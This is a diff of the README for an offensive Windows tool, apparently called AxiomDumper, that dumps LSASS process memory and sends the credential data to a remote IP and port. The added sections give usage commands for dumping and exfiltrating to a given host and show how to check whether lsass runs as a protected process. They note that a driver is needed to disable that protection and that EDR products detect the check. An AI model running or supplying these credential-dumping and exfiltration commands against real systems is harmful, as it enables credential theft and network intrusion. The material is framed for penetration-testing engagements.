@@ -27,6 +27,18 @@ TODO list :
 
 ## Usage
 
+Run the program with /help or no arguments to get usage informations
+```powershell
+PS> .\AxiomDumper.exe /help
+Usage: Y:\AxiomDumper\x64\Release\AxiomDumper.exe [/help|/PPcheck <PID>] IP PORT
+
+Examples :
+
+.\AxiomDumper.exe 192.168.1.20 # Dumps and send data over network to the specified IP and PORT
+.\AxiomDumper.exe /PPcheck 720 # Checks protection status of the process identified by PID 720
+.\AxiomDumper.exe /help # Print usage info
+```
+
 Just run the binary as Administrator, passing the exfiltration IP and PORT as arguments.
 
 Examples :
@@ -58,6 +70,29 @@ logon_server ADLAB-DC01
 ...
 
 ```
+
+## Checking RunAsPPL flag
+If you get this error : `[!] Could not duplicate a SYSTEM handle with necessary access rights, process has probably the RunAsPPL flag on`
+Then you can check the protection status of lsass (or any process really) by running the program with:
+
+```powershell
+PS> tasklist | findstr lsass
+lsass.exe               732  Services       0       26,4K
+PS> .\AxiomDumper /PPcheck 732
+Protection status for process: 732 (\Device\HarddiskVolume2\Windows\System32\lsass.exe)
+
+    Type:   PsProtectedTypeNone
+    Signer: PsProtectedSignerNone
+```
+
+This check requires admin privileges.
+If it does not display "PsProtectedTypeNone", then lsass is running as a protected process and you will need a driver to disable this protection.
+WARNING: This check will be detected by some EDRs. It does not intend to evade detection and it will trigger alerts during your engagement if you are not careful. You've been warned.
+
+## Debugging
+You can enable debugging output by modifying this line in AxiomDumper.h :
+![](debug.png)
+WARNING : This will generate a binary with embedded strings that will make it somewhat more prone to detection, reserve this for testing environments.
 
 ## Community
 
